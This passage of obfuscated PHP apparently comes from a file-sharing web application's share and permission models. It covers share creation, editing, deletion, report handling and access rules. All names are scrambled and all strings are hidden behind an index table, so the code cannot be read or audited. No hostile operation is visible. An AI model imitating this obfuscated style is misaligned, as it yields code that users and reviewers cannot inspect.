=> array($½ó¸ò[1032], 0), $½ó¸ò[2009] => $½ó¸ò[1962])); if ($ªìœ˜Î– == $½ó¸ò[2010]) { $¼ÍêÀ³Ê = array($½ó¸ò[540] => 1); } else { if ($ªìœ˜Î– == $½ó¸ò[1181]) { $¼ÍêÀ³Ê = array($½ó¸ò[641] => 1); } } $¼ÍêÀ³Ê[$½ó¸ò[1666]] = USER_ID; $íãÓ¼ª  = $this->where($¼ÍêÀ³Ê)->selectPage($©ƒßãã™); return $íãÓ¼ª ; } protected function listToMe($¡Í£ĞŸ = 300) { $±öÏ§ÕÔ =& $_SERVER[–Ú¬çÁ]; $ÙÈ»´Æ£ = Model($±öÏ§ÕÔ[2011])->userGroupParents(USER_ID); $Ø×²ÅØ÷ = array($±öÏ§ÕÔ[626] => SourceModel::TYPE_USER, $±öÏ§ÕÔ[548] => USER_ID); if ($ÙÈ»´Æ£) { $Ø×²ÅØ÷ = array(array($±öÏ§ÕÔ[626] => SourceModel::TYPE_USER, $±öÏ§ÕÔ[548] => USER_ID), array($±öÏ§ÕÔ[626] => SourceModel::TYPE_GROUP, $±öÏ§ÕÔ[548] => array($±öÏ§ÕÔ[7], $ÙÈ»´Æ£)), $±öÏ§ÕÔ[2009] => $±öÏ§ÕÔ[1962]); } $ûÒ™îùÈ = Model($±öÏ§ÕÔ[644])->where($Ø×²ÅØ÷)->selectPage($¡Í£ĞŸ); $¥¤ù…ÀÎ = array_to_keyvalue_group($ûÒ™îùÈ[$±öÏ§ÕÔ[422]], $±öÏ§ÕÔ[643]); if (!$¥¤ù…ÀÎ) { return $ûÒ™îùÈ; } $™Ï¬òá = $±öÏ§ÕÔ[2012]; $Ø×²ÅØ÷ = array($±öÏ§ÕÔ[643] => array($±öÏ§ÕÔ[469], array_keys($¥¤ù…ÀÎ)), $±öÏ§ÕÔ[1666] => array($±öÏ§ÕÔ[1034], $±öÏ§ÕÔ[222])); $§Ùìª° = $this->field($™Ï¬òá)->where($Ø×²ÅØ÷)->select(); foreach ($§Ùìª° as $“­åÃã => &$ÄªşÊÌ‹) { $ÄªşÊÌ‹[$±öÏ§ÕÔ[2008]] = $¥¤ù…ÀÎ[$ÄªşÊÌ‹[$±öÏ§ÕÔ[643]]]; } unset($ÄªşÊÌ‹); $Ò¢“˜ÈÌ = array($±öÏ§ÕÔ[2013] => $§Ùìª°, $±öÏ§ÕÔ[2014] => $ûÒ™îùÈ[$±öÏ§ÕÔ[419]]); return $Ò¢“˜ÈÌ; } protected function shareAdd($ú•Éêõé, $şäÆ´Íí) { $Î…ºäıÅ =& $_SERVER[–Ú¬çÁ]; $½âÚ£‘Š = $this->_addShareData($ú•Éêõé, $şäÆ´Íí); if (!empty($şäÆ´Íí[$Î…ºäıÅ[2015]])) { $this->_shareAuthSet($½âÚ£‘Š, $şäÆ´Íí[$Î…ºäıÅ[2015]]); } $this->shareEventAdd($ú•Éêõé, $şäÆ´Íí, $Î…ºäıÅ[2016]); return $½âÚ£‘Š; } protected function shareAddSystem($úŞÜîæ‚, $Ä¦›‰ğå) { $¾ç™»î‚ =& $_SERVER[–Ú¬çÁ]; $‚´Šğ… = $this->_addShareData($úŞÜîæ‚, $Ä¦›‰ğå, $¾ç™»î‚[179]); $this->_shareAuthSet($‚´Šğ…, $Ä¦›‰ğå[$¾ç™»î‚[2015]]); return $‚´Šğ…; } private function shareEventAdd($´Ôƒ•Â´, $Û¨û“¼‹, $×öìÄ½ = "\x61\x64\x64") { $¸Ø¿ÈÌò =& $_SERVER[–Ú¬çÁ]; if (!$´Ôƒ•Â´ || $´Ôƒ•Â´ == $¸Ø¿ÈÌò[222]) { return; } if ($×öìÄ½ == $¸Ø¿ÈÌò[2016]) { if ($Û¨û“¼‹[$¸Ø¿ÈÌò[540]] == $¸Ø¿ÈÌò[88]) { Model($¸Ø¿ÈÌò[611])->eventShare($´Ôƒ•Â´, $¸Ø¿ÈÌò[2017]); } if ($Û¨û“¼‹[$¸Ø¿ÈÌò[641]] == $¸Ø¿ÈÌò[88]) { Model($¸Ø¿ÈÌò[611])->eventShare($´Ôƒ•Â´, $¸Ø¿ÈÌò[2018]); } return; } $ú…ëœÕ = $this->getInfoByPath($´Ôƒ•Â´); $îø¢œ—Ğ = $¸Ø¿ÈÌò[2019]; if ($ú…ëœÕ[$¸Ø¿ÈÌò[540]] == $¸Ø¿ÈÌò[222] && $Û¨û“¼‹[$¸Ø¿ÈÌò[540]] == $¸Ø¿ÈÌò[88]) { $îø¢œ—Ğ = $¸Ø¿ÈÌò[2017]; } if ($ú…ëœÕ[$¸Ø¿ÈÌò[540]] == $¸Ø¿ÈÌò[88] && $Û¨û“¼‹[$¸Ø¿ÈÌò[540]] == $¸Ø¿ÈÌò[222]) { $îø¢œ—Ğ = $¸Ø¿ÈÌò[2020]; } if ($ú…ëœÕ[$¸Ø¿ÈÌò[641]] == $¸Ø¿ÈÌò[222] && $Û¨û“¼‹[$¸Ø¿ÈÌò[641]] == $¸Ø¿ÈÌò[88]) { $îø¢œ—Ğ = $¸Ø¿ÈÌò[2018]; } if ($ú…ëœÕ[$¸Ø¿ÈÌò[641]] == $¸Ø¿ÈÌò[88] && $Û¨û“¼‹[$¸Ø¿ÈÌò[641]] == $¸Ø¿ÈÌò[222]) { $îø¢œ—Ğ = $¸Ø¿ÈÌò[2021]; } Model($¸Ø¿ÈÌò[611])->eventShare($´Ôƒ•Â´, $îø¢œ—Ğ); return; } private function _addShareData($ŞÄÍ“Ë, $¿¼‚«òÌ = array(), $şÒ»‡ÇÂ = false) { $Å¯§ç‡” =& $_SERVER[–Ú¬çÁ]; $İĞšˆÑ = $şÒ»‡ÇÂ == $Å¯§ç‡”[179] ? 0 : USER_ID; $‘Òå€ù = array($Å¯§ç‡”[468] => $ŞÄÍ“Ë, $Å¯§ç‡”[1657] => $İĞšˆÑ); if ($ŞÄÍ“Ë == 0) { $‘Òå€ù = array($Å¯§ç‡”[2022] => $¿¼‚«òÌ[$Å¯§ç‡”[1195]], $Å¯§ç‡”[1657] => $İĞšˆÑ); } if ($Á©Üœ§‹ = $this->where($‘Òå€ù)->find()) { return $Á©Üœ§‹[$Å¯§ç‡”[643]]; } if ($ŞÄÍ“Ë == 0) { $Æü¨ï«« = array($Å¯§ç‡”[32] => get_path_this($¿¼‚«òÌ[$Å¯§ç‡”[84]])); } else { $Æü¨ï«« = Model($Å¯§ç‡”[845])->sourceInfo($ŞÄÍ“Ë); if (!$Æü¨ï««) { return !1; } } if (!$¿¼‚«òÌ[$Å¯§ç‡”[1561]]) { $¿¼‚«òÌ[$Å¯§ç‡”[1561]] = $Æü¨ï««[$Å¯§ç‡”[32]]; } $õ°¼úàí = array($Å¯§ç‡”[1657] => $İĞšˆÑ, $Å¯§ç‡”[468] => $ŞÄÍ“Ë, $Å¯§ç‡”[1561] => $Å¯§ç‡”[12], $Å¯§ç‡”[540] => 0, $Å¯§ç‡”[641] => 0, $Å¯§ç‡”[1195] => $Å¯§ç‡”[12], $Å¯§ç‡”[360] => $Å¯§ç‡”[12], $Å¯§ç‡”[909] => $Å¯§ç‡”[12], $Å¯§ç‡”[2023] => 0, $Å¯§ç‡”[2024] => 0, $Å¯§ç‡”[781] => 0, $Å¯§ç‡”[2025] => $Å¯§ç‡”[12], $Å¯§ç‡”[2006] => $Å¯§ç‡”[12]); $™ç±·İ = explode($Å¯§ç‡”[50], $Å¯§ç‡”[2026]); foreach ($™ç±·İ as $ğÄÓâ‚) { if (!isset($¿¼‚«òÌ[$ğÄÓâ‚])) { continue; } $õ°¼úàí[$ğÄÓâ‚] = $¿¼‚«òÌ[$ğÄÓâ‚]; } $å™ø¸±¢ = $this->add($õ°¼úàí); $ğÉÂ»¼Ä = array($Å¯§ç‡”[2006] => short_id($å™ø¸±¢)); $this->where(array($Å¯§ç‡”[2027] => $å™ø¸±¢))->save($ğÉÂ»¼Ä); return $å™ø¸±¢; } private function _shareAuthSet($âÍÁ´³Ë, $Ô®Œçí) { $çöĞİè =& $_SERVER[–Ú¬çÁ]; if (!is_array($Ô®Œçí)) { return !1; } $şÉ²”Ì = Model($çöĞİè[1972]); $şÉ²”Ì->where(array($çöĞİè[643] => $âÍÁ´³Ë))->delete(); $ò øÀ” = array(); foreach ($Ô®Œçí as $ÌÑ´Şş—) { $êãï™­ = SourceModel::TYPE_USER; if ($ÌÑ´Şş—[$çöĞİè[178]] == SourceModel::TYPE_GROUP) { $êãï™­ = SourceModel::TYPE_GROUP; } $ËÒ¦£Ïà = array($çöĞİè[643] => $âÍÁ´³Ë, $çöĞİè[178] => $êãï™­, $çöĞİè[548] => intval($ÌÑ´Şş—[$çöĞİè[548]]), $çöĞİè[1968] => 0, $çöĞİè[2028] => -1); if ($ÌÑ´Şş—[$çöĞİè[1968]]) { $ËÒ¦£Ïà[$çöĞİè[1968]] = $ÌÑ´Şş—[$çöĞİè[1968]]; } else { if ($ÌÑ´Şş—[$çöĞİè[2028]]) { $ËÒ¦£Ïà[$çöĞİè[2028]] = $ÌÑ´Şş—[$çöĞİè[2028]]; } } $ò øÀ”[] = $ËÒ¦£Ïà; } return $şÉ²”Ì->addAll($ò øÀ”, array(), !0); } public function numViewAdd($‰Ññ’ÆÊ) { $«£¼Í´À =& $_SERVER[–Ú¬çÁ]; $Ìş—˜Ë = array($«£¼Í´À[2027] => $‰Ññ’ÆÊ); $this->where($Ìş—˜Ë)->setAdd($«£¼Í´À[2023]); } public function numDownloadAdd($€şûì‡¦) { $€¥ì Ñç =& $_SERVER[–Ú¬çÁ]; $¿•¥ªÈç = array($€¥ì Ñç[2027] => $€şûì‡¦); $this->where($¿•¥ªÈç)->setAdd($€¥ì Ñç[2024]); } protected function shareEdit($€€¶ıîû, $ŞÙƒ³Ê’) { $ûàèŸ¹— =& $_SERVER[–Ú¬çÁ]; $ˆÇÚìş± = $this->getInfo($€€¶ıîû); if (!$ˆÇÚìş±) { return !1; } $this->_checkLinkShare($ŞÙƒ³Ê’, $ˆÇÚìş±); $ÜıŞòàÆ = array(); $¬ñÁûœ = explode($ûàèŸ¹—[50], $ûàèŸ¹—[2029]); foreach ($¬ñÁûœ as $çØ²½„â) { if (!array_key_exists($çØ²½„â, $ŞÙƒ³Ê’)) { continue; } $ÜıŞòàÆ[$çØ²½„â] = $ŞÙƒ³Ê’[$çØ²½„â]; } $this->shareEventAdd($ˆÇÚìş±[$ûàèŸ¹—[181]], $ŞÙƒ³Ê’, $ûàèŸ¹—[1834]); $this->where(array($ûàèŸ¹—[2027] => $€€¶ıîû))->save($ÜıŞòàÆ); if (isset($ŞÙƒ³Ê’[$ûàèŸ¹—[2015]])) { $this->_shareAuthSet($€€¶ıîû, $ŞÙƒ³Ê’[$ûàèŸ¹—[2015]]); } return !0; } private function _checkLinkShare($›Ù€éøâ, $­éÈòı¥) { $±–ÆÀÀï =& $_SERVER[–Ú¬çÁ]; if ($›Ù€éøâ[$±–ÆÀÀï[540]] != $±–ÆÀÀï[88]) { return; } $‰öªíğ³ = $­éÈòı¥[$±–ÆÀÀï[87]][$±–ÆÀÀï[181]]; if ($­éÈòı¥[$±–ÆÀÀï[87]][$±–ÆÀÀï[33]] != $±–ÆÀÀï[224]) { $¦…¾È½° = $this->_folderReport($‰öªíğ³); if (!$¦…¾È½°) { return; } show_json(LNG($±–ÆÀÀï[2030]) . $±–ÆÀÀï[2031] . $¦…¾È½°, !1); } $Æ²ôÉ = Model($±–ÆÀÀï[845])->fileInfoGet($­éÈòı¥[$±–ÆÀÀï[87]][$±–ÆÀÀï[181]]); if (!$Æ²ôÉ) { return; } $›˜ªá±Ï = $this->shareFileMeta($Æ²ôÉ[$±–ÆÀÀï[518]]); if (isset($›˜ªá±Ï[$±–ÆÀÀï[427]]) && $›˜ªá±Ï[$±–ÆÀÀï[427]] == $±–ÆÀÀï[88]) { show_json(LNG($±–ÆÀÀï[2032]), !1); } } private function _folderReport($¦áöÆü§) { $³ Àş¯ =& $_SERVER[–Ú¬çÁ]; $ù‰©Í•½ = array($³ Àş¯[518] => array($³ Àş¯[1032], 0), $³ Àş¯[770] => 3); $ßäÇØå› = Model($³ Àş¯[2033])->where($ù‰©Í•½)->field($³ Àş¯[518])->select(); if (!$ßäÇØå›) { return !1; } $ßäÇØå› = array_to_keyvalue($ßäÇØå›, $³ Àş¯[12], $³ Àş¯[518]); $ñôœ­èš = $³ Àş¯[50] . $¦áöÆü§ . $³ Àş¯[50]; $ù‰©Í•½ = array($³ Àş¯[518] => array($³ Àş¯[7], $ßäÇØå›), $³ Àş¯[563] => array($³ Àş¯[436], "\x25{$ñôœ­èš}\45"), $³ Àş¯[482] => 0); $¸öïû£ = Model($³ Àş¯[845])->where($ù‰©Í•½)->field($³ Àş¯[2034])->find(); if (!$¸öïû£) { return !1; } $ç ŞÂ‹Ë = substr($¸öïû£[$³ Àş¯[563]], strpos($¸öïû£[$³ Àş¯[563]], $ñôœ­èš)); $ù‰©Í•½ = array($³ Àş¯[181] => array($³ Àş¯[7], trim($ç ŞÂ‹Ë, $³ Àş¯[50]))); $è™äúîç = Model($³ Àş¯[845])->where($ù‰©Í•½)->field($³ Àş¯[32])->select(); $¾¾–ÛÜ = array_to_keyvalue($è™äúîç, $³ Àş¯[12], $³ Àş¯[32]); $¾¾–ÛÜ[] = $¸öïû£[$³ Àş¯[32]]; return implode($³ Àş¯[8], $¾¾–ÛÜ); } protected function remove($ÖÈºãµ) { $ÛæÂÙª“ =& $_SERVER[–Ú¬çÁ]; if (is_array($ÖÈºãµ)) { $ÖÈºãµ = array($ÛæÂÙª“[7], $ÖÈºãµ); } $äÔ˜Œ = array($ÛæÂÙª“[643] => $ÖÈºãµ); $åñ€Á²ˆ = $this->where($äÔ˜Œ)->delete(); if ($åñ€Á²ˆ) { Model($ÛæÂÙª“[644])->where(array($ÛæÂÙª“[643] => $ÖÈºãµ))->delete(); } $ôñÈ®Ú = is_array($ÖÈºãµ) ? $ÖÈºãµ[1] : array($ÖÈºãµ); for ($«©„¡ä¸ = 0; $«©„¡ä¸ < count($ôñÈ®Ú); $«©„¡ä¸++) { $ÚŸ›Ç–î = $this->getInfo($ôñÈ®Ú[$«©„¡ä¸]); if ($ÚŸ›Ç–î[$ÛæÂÙª“[641]] == $ÛæÂÙª“[88]) { Model($ÛæÂÙª“[611])->eventShare($ÚŸ›Ç–î[$ÛæÂÙª“[181]], $ÛæÂÙª“[2021]); } if ($ÚŸ›Ç–î[$ÛæÂÙª“[540]] == $ÛæÂÙª“[88]) { Model($ÛæÂÙª“[611])->eventShare($ÚŸ›Ç–î[$ÛæÂÙª“[181]], $ÛæÂÙª“[2020]); } } return $åñ€Á²ˆ; } protected function removeBySource($î¨Îğ‰¿) { $˜°‚½¤» =& $_SERVER[–Ú¬çÁ]; $×èˆ³Ó = array($˜°‚½¤»[468] => array($˜°‚½¤»[469], $î¨Îğ‰¿)); $ĞÙ±î®ô = $this->field($˜°‚½¤»[643])->where($×èˆ³Ó)->select(); $ĞÙ±î®ô = array_to_keyvalue($ĞÙ±î®ô, $˜°‚½¤»[12], $˜°‚½¤»[643]); if (!$ĞÙ±î®ô) { return; } $×èˆ³Ó = array($˜°‚½¤»[2027] => array($˜°‚½¤»[469], $ĞÙ±î®ô)); $this->where($×èˆ³Ó)->delete(); Model($˜°‚½¤»[644])->where($×èˆ³Ó)->delete(); } public function listAll($ùÔšÔÊ½) { $šçò†üè =& $_SERVER[–Ú¬çÁ]; $†ñ ó›³ = array(); if ($ùÔšÔÊ½[$šçò†üè[1666]]) { $†ñ ó›³[$šçò†üè[1666]] = $ùÔšÔÊ½[$šçò†üè[1666]]; } if ($ùÔšÔÊ½[$šçò†üè[780]]) { $¬¾øì›Â = $ùÔšÔÊ½[$šçò†üè[781]] ? $ùÔšÔÊ½[$šçò†üè[781]] : strtotime(date($šçò†üè[2035])); $†ñ ó›³[$šçò†üè[225]] = array($šçò†üè[386], array($ùÔšÔÊ½[$šçò†üè[780]], $¬¾øì›Â)); } if ($ùÔšÔÊ½[$šçò†üè[33]]) { $†ñ ó›³[$ùÔšÔÊ½[$šçò†üè[33]]] = 1; } else { $†ñ ó›³[] = array($šçò†üè[540] => array($šçò†üè[1032], 0), $šçò†üè[641] => array($šçò†üè[1032], 0), $šçò†üè[2009] => $šçò†üè[1962]); } if ($ùÔšÔÊ½[$šçò†üè[1958]]) { $†ñ ó›³[] = array($šçò†üè[2006] => $ùÔšÔÊ½[$šçò†üè[1958]], $šçò†üè[1561] => array($šçò†üè[436], "\45{$ùÔšÔÊ½[$šçò†üè[1958]]}\45"), $šçò†üè[2009] => $šçò†üè[1962]); } $’ò µ¦Ä = $this->_makeOrder()->where($†ñ ó›³)->selectPage(20); if (empty($’ò µ¦Ä[$šçò†üè[422]])) { return array(); } $this->_listDataApply($’ò µ¦Ä[$šçò†üè[422]]); return $’ò µ¦Ä; } public function listDataApply($óõÛ–§ó) { $this->_listDataApply($óõÛ–§ó); return $óõÛ–§ó; } private function _listDataApply(&$˜Ğß±Òê) { $£ã„ñÚü =& $_SERVER[–Ú¬çÁ]; $‹‹¸’Î = array_to_keyvalue($˜Ğß±Òê, $£ã„ñÚü[12], $£ã„ñÚü[1666]); $—ÁôßÚú = Model($£ã„ñÚü[577])->userListInfo(array_unique($‹‹¸’Î)); $é‘İŠ¾À = array_to_keyvalue($˜Ğß±Òê, $£ã„ñÚü[12], $£ã„ñÚü[181]); $Š©ò¨ì = Model($£ã„ñÚü[845])->sourceListInfo($é‘İŠ¾À, !0); foreach ($˜Ğß±Òê as $íÓÙ‹ => &$è¢Ûôš™) { $îÎâ„ÇÜ = $è¢Ûôš™[$£ã„ñÚü[1666]]; $è¢Ûôš™[$£ã„ñÚü[2036]] = $—ÁôßÚú[$îÎâ„ÇÜ] ? $—ÁôßÚú[$îÎâ„ÇÜ] : !1; $ÁÙÎèøã = $è¢Ûôš™[$£ã„ñÚü[181]]; $è¢Ûôš™[$£ã„ñÚü[87]] = $Š©ò¨ì[$ÁÙÎèøã] ? $Š©ò¨ì[$ÁÙÎèøã] : !1; if ($è¢Ûôš™[$£ã„ñÚü[87]][$£ã„ñÚü[482]] == $£ã„ñÚü[88]) { unset($˜Ğß±Òê[$íÓÙ‹]); } if ($è¢Ûôš™[$£ã„ñÚü[87]] != $£ã„ñÚü[222] && !$è¢Ûôš™[$£ã„ñÚü[87]]) { unset($˜Ğß±Òê[$íÓÙ‹]); } } unset($è¢Ûôš™); $˜Ğß±Òê = array_values($˜Ğß±Òê); } private function _makeOrder($•È¶‹ü¢ = '') { $õ¾ë£¿õ =& $_SERVER[–Ú¬çÁ]; $‰ÆÚìÀĞ = array($õ¾ë£¿õ[225], $õ¾ë£¿õ[781], $õ¾ë£¿õ[2023], $õ¾ë£¿õ[2024]); $Óüş°Û = array($õ¾ë£¿õ[500] => $õ¾ë£¿õ[501], $õ¾ë£¿õ[502] => $õ¾ë£¿õ[503]); $îñâœ = Input::get($õ¾ë£¿õ[507], $õ¾ë£¿õ[7], $õ¾ë£¿õ[474], $‰ÆÚìÀĞ); $¦å²½¿¢ = Input::get($õ¾ë£¿õ[508], $õ¾ë£¿õ[7], $õ¾ë£¿õ[2037], array($õ¾ë£¿õ[1955], $õ¾ë£¿õ[502])); $¦å²½¿¢ = $Óüş°Û[$¦å²½¿¢]; $•È¶‹ü¢ = $•È¶‹ü¢ . "{$îñâœ}\40{$¦å²½¿¢}"; return $this->order($•È¶‹ü¢); } public function reportAdd($ò›Ù‹ß) { $‹»òèÊŒ =& $_SERVER[–Ú¬çÁ]; $µìâåİ¤ = array($‹»òèÊŒ[643] => $ò›Ù‹ß[$‹»òèÊŒ[643]], $‹»òèÊŒ[1666] => USER_ID); if (Model($‹»òèÊŒ[2033])->where($µìâåİ¤)->find()) { return !1; } $‡ƒÑÍşœ = array($‹»òèÊŒ[643] => $ò›Ù‹ß[$‹»òèÊŒ[643]], $‹»òèÊŒ[1561] => $ò›Ù‹ß[$‹»òèÊŒ[1561]], $‹»òèÊŒ[181] => $ò›Ù‹ß[$‹»òèÊŒ[181]], $‹»òèÊŒ[518] => $ò›Ù‹ß[$‹»òèÊŒ[518]], $‹»òèÊŒ[1666] => USER_ID, $‹»òèÊŒ[33] => $ò›Ù‹ß[$‹»òèÊŒ[33]], $‹»òèÊŒ[503] => $ò›Ù‹ß[$‹»òèÊŒ[503]]); return Model($‹»òèÊŒ[2033])->add($‡ƒÑÍşœ); } public function reportList($÷ƒ‹×± ) { $ºıö›ü‚ =& $_SERVER[–Ú¬çÁ]; $Á¾æ¤€À = array(); if ($÷ƒ‹×± [$ºıö›ü‚[780]]) { $Ã¼ôº© = $÷ƒ‹×± [$ºıö›ü‚[781]] ? $÷ƒ‹×± [$ºıö›ü‚[781]] : strtotime(date($ºıö›ü‚[2035])); $Á¾æ¤€À[$ºıö›ü‚[225]] = array($ºıö›ü‚[386], array($÷ƒ‹×± [$ºıö›ü‚[780]], $Ã¼ôº©)); } if (isset($÷ƒ‹×± [$ºıö›ü‚[33]]) && in_array($÷ƒ‹×± [$ºıö›ü‚[33]], array($ºıö›ü‚[88], $ºıö›ü‚[487], $ºıö›ü‚[2038], $ºıö›ü‚[2039], $ºıö›ü‚[2040]))) { $Á¾æ¤€À[$ºıö›ü‚[33]] = $÷ƒ‹×± [$ºıö›ü‚[33]]; } if (isset($÷ƒ‹×± [$ºıö›ü‚[770]]) && in_array($÷ƒ‹×± [$ºıö›ü‚[770]], array($ºıö›ü‚[222], $ºıö›ü‚[88], $ºıö›ü‚[487], $ºıö›ü‚[2038]))) { $Á¾æ¤€À[$ºıö›ü‚[770]] = $÷ƒ‹×± [$ºıö›ü‚[770]]; } $¡ÎÉ¾Ÿø = Input::get($ºıö›ü‚[508], $ºıö›ü‚[7], $ºıö›ü‚[2037], array($ºıö›ü‚[1955], $ºıö›ü‚[502])); $ª‡ß´– = array($ºıö›ü‚[500] => $ºıö›ü‚[501], $ºıö›ü‚[502] => $ºıö›ü‚[503]); $äÏƒïÛ = $ºıö›ü‚[2041] . $ª‡ß´–[$¡ÎÉ¾Ÿø]; $ĞòêµÙØ = Model($ºıö›ü‚[2033])->where($Á¾æ¤€À)->order($äÏƒïÛ)->selectPage(20); if (empty($ĞòêµÙØ[$ºıö›ü‚[422]])) { return array(); } $„‘¤š®É = array_to_keyvalue_group($ĞòêµÙØ[$ºıö›ü‚[422]], $ºıö›ü‚[770], $ºıö›ü‚[643]); if (!empty($„‘¤š®É[0])) { $÷ƒ‹×±  = $„‘¤š®É[0]; $Á¾æ¤€À = array($ºıö›ü‚[643] => array($ºıö›ü‚[7], $÷ƒ‹×± )); $‚ÎÕ›«à = $this->where($Á¾æ¤€À)->field($ºıö›ü‚[643])->select(); $‚ÎÕ›«à = array_to_keyvalue($‚ÎÕ›«à, $ºıö›ü‚[12], $ºıö›ü‚[643]); $‰•â½ó = array_diff($÷ƒ‹×± , $‚ÎÕ›«à); if (!empty($‰•â½ó)) { foreach ($ĞòêµÙØ[$ºıö›ü‚[422]] as $‚Ï×€Å => $ÃõÌÇ“») { if (in_array($ÃõÌÇ“»[$ºıö›ü‚[643]], $‰•â½ó)) { unset($ĞòêµÙØ[$ºıö›ü‚[422]][$‚Ï×€Å]); } } } } $this->_listDataApply($ĞòêµÙØ[$ºıö›ü‚[422]]); return $ĞòêµÙØ; } public function reportStatus($ó£ªØËˆ) { $â„à›ò„ =& $_SERVER[–Ú¬çÁ]; $­·ÛÉ±ë = array($â„à›ò„[452] => $ó£ªØËˆ[$â„à›ò„[452]]); $ˆ‹‡ÊÉÏ = Model($â„à›ò„[2033])->where($­·ÛÉ±ë)->field($â„à›ò„[2042])->find(); if (!$ˆ‹‡ÊÉÏ) { return !1; } $§ûÑÆ£ç = array($â„à›ò„[770] => $ó£ªØËˆ[$â„à›ò„[770]]); if ($ó£ªØËˆ[$â„à›ò„[770]] == $â„à›ò„[2038] && $ˆ‹‡ÊÉÏ[$â„à›ò„[770]] == $â„à›ò„[2038]) { $§ûÑÆ£ç[$â„à›ò„[770]] = 0; } $ã¦°ÊñÍ = Model($â„à›ò„[2033])->where($­·ÛÉ±ë)->save($§ûÑÆ£ç); if ($ó£ªØËˆ[$â„à›ò„[770]] == $â„à›ò„[487]) { if ($ˆ‹‡ÊÉÏ[$â„à›ò„[518]] != $â„à›ò„[222] && $this->shareFileMeta($ˆ‹‡ÊÉÏ[$â„à›ò„[518]])) { $this->shareFileMeta($ˆ‹‡ÊÉÏ[$â„à›ò„[518]], 0); } $this->remove($ˆ‹‡ÊÉÏ[$â„à›ò„[643]]); return !0; } if ($ã¦°ÊñÍ && $ó£ªØËˆ[$â„à›ò„[770]] == $â„à›ò„[2038]) { $ïÄå‘½Í = $§ûÑÆ£ç[$â„à›ò„[770]] == $â„à›ò„[2038] ? 1 : 0; $this->shareFileMeta($ˆ‹‡ÊÉÏ[$â„à›ò„[518]], $ïÄå‘½Í); $this->removeByFile($ˆ‹‡ÊÉÏ[$â„à›ò„[518]]); } return $ã¦°ÊñÍ; } private function removeByFile($Æı°—É) { $ª€×ñ ¡ =& $_SERVER[–Ú¬çÁ]; $Ñ¨ŠŒÓ£ = Model($ª€×ñ ¡[845])->where(array($ª€×ñ ¡[518] => $Æı°—É))->field($ª€×ñ ¡[181])->select(); $¡»“ÌÜ¦ = array_to_keyvalue($Ñ¨ŠŒÓ£, $ª€×ñ ¡[12], $ª€×ñ ¡[181]); $öô­ÛÓÔ = array($ª€×ñ ¡[181] => array($ª€×ñ ¡[7], $¡»“ÌÜ¦), $ª€×ñ ¡[540] => 1); $Ñ¨ŠŒÓ£ = $this->where($öô­ÛÓÔ)->field($ª€×ñ ¡[643])->select(); if (empty($Ñ¨ŠŒÓ£)) { return; } $ğÉİæ¸ = array_to_keyvalue($Ñ¨ŠŒÓ£, $ª€×ñ ¡[12], $ª€×ñ ¡[643]); $this->remove($ğÉİæ¸); } private function shareFileMeta($Íñ†Å’ê, $¿ˆËüÖ = null) { $îƒì»ê¨ =& $_SERVER[–Ú¬çÁ]; $—Ìé»Îˆ = array($îƒì»ê¨[518] => $Íñ†Å’ê, $îƒì»ê¨[94] => $îƒì»ê¨[2043]); if (is_null($¿ˆËüÖ)) { return Model($îƒì»ê¨[2044])->where($—Ìé»Îˆ)->find(); } $—Ìé»Îˆ[$îƒì»ê¨[427]] = $¿ˆËüÖ; Model($îƒì»ê¨[2044])->add($—Ìé»Îˆ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\143\x65\x5f\x61\165\164\150"; public function getAuth($Òó„µ´ ) { $¢¹÷åÊ¯ =& $_SERVER[–Ú¬çÁ]; $óåÛóÆ‚ = $this->sourceAuthSelect($Òó„µ´ ); $‡˜³Óğ = array(); $¨Ë”¨ã€ = array(); $½çêŠ‡ä = 2 << 25; foreach ($óåÛóÆ‚ as $ÖèŸÒåâ) { $Ñå«…Ğ» = Model($¢¹÷åÊ¯[550])->listData($ÖèŸÒåâ[$¢¹÷åÊ¯[1968]]); if (!$Ñå«…Ğ») { continue; } $‡˜³Óğ[] = $ÖèŸÒåâ; $½ê¸îˆ± = 0; if ($ÖèŸÒåâ[$¢¹÷åÊ¯[178]] == SourceModel::TYPE_GROUP) { $½ê¸îˆ± = $½çêŠ‡ä * 2; } if ($ÖèŸÒåâ[$¢¹÷åÊ¯[178]] == SourceModel::TYPE_USER) { $½ê¸îˆ± = $½çêŠ‡ä; } if ($ÖèŸÒåâ[$¢¹÷åÊ¯[178]] == SourceModel::TYPE_USER && $ÖèŸÒåâ[$¢¹÷åÊ¯[548]] == $¢¹÷åÊ¯[222]) { $½ê¸îˆ± = 0; } $¨Ë”¨ã€[] = $Ñå«…Ğ»[$¢¹÷åÊ¯[464]] + $½ê¸îˆ±; } array_multisort($¨Ë”¨ã€, SORT_DESC, $‡˜³Óğ); return $‡˜³Óğ; } public function sourceAuthSelect($üì‡ª¢) { $îÜ‡­æ™ =& $_SERVER[–Ú¬çÁ]; static $ñ»¿ ©« = array(); $Ùëô©÷½ = is_array($üì‡ª¢) ? !1 : !0; if ($Ùëô©÷½) { $üì‡ª¢ = array($üì‡ª¢); } $²ßÚ”ç¦ = array(); foreach ($üì‡ª¢ as $Ã¦õñâß) { if (isset($ñ»¿ ©«[$Ã¦õñâß])) { $²ßÚ”ç¦[$Ã¦õñâß] = $ñ»¿ ©«[$Ã¦õñâß]; } } if (count($²ßÚ”ç¦) == count($üì‡ª¢)) { return $Ùëô©÷½ ? $²ßÚ”ç¦[$üì‡ª¢[0]] : $²ßÚ”ç¦; } $§­À¥œŠ = $îÜ‡­æ™[2045]; $µ„ƒöñ = array($îÜ‡­æ™[181] => array($îÜ‡­æ™[7], $üì‡ª¢)); $¬Êé—¥¯ = $this->field($§­À¥œŠ)->order($îÜ‡­æ™[452])->where($µ„ƒöñ)->select(); $ß¦ŠÇ© = array_to_keyvalue_group($¬Êé—¥¯, $îÜ‡­æ™[181]); foreach ($üì‡ª¢ as $Ã¦õñâß) { $ñ»¿ ©«[$Ã¦õñâß] = $ß¦ŠÇ©[$Ã¦õñâß] ? $ß¦ŠÇ©[$Ã¦õñâß] : array(); } if ($Ùëô©÷½) { return $¬Êé—¥¯; } return $ß¦ŠÇ©; } public function setAuth($ŠÉ§Ò², $Àöù­ñÓ) { $¿èÆôü =& $_SERVER[–Ú¬çÁ]; $üöí¸Û® = Model($¿èÆôü[1352])->sourceInfo($ŠÉ§Ò²); if (!$üöí¸Û®) { return !1; } if ($üöí¸Û®[$¿èÆôü[178]] != SourceModel::TYPE_GROUP) { return !1; } $îÙâ¸™ = 1; $•ó‡ñ‡® = $üöí¸Û®[$¿èÆôü[548]]; if ($•ó‡ñ‡® != $îÙâ¸™) { 